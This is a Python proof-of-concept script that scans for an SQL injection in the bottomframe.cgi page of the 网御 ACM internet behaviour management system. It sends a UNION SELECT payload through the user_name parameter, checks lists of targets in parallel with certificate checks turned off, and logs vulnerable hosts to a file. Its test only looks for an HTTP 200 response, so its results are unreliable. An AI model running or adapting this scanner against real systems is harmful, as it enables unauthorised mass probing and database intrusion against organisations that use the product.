import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """
  ______  __         __
 / ___/ |/_/__ ___ _/ /
/ /___>  <(_-</ _ `/ / 
\___/_/|_/___/\_, /_/  
               /_/     
"""
    print(test)


def poc(target):
    payload = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 "

    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
    }
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3) AppleWebKit/605.1.15(KHTML,likeGecko)',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close'
    }
    try:
        res1 = requests.get(url=target,verify=False,timeout=15)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=15,headers=headers)
            if res2.status_code == 200 :
                print(f"[+]{target}存在sql注入漏洞")
                with open ("网御_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"[+]{target}存在sql注入漏洞\n")

            else:
                print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"{target}该网站可能存在漏洞，请手工测试")
def main():
    banner()
    parser =argparse.ArgumentParser(description="网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

if __name__=='__main__':
    main()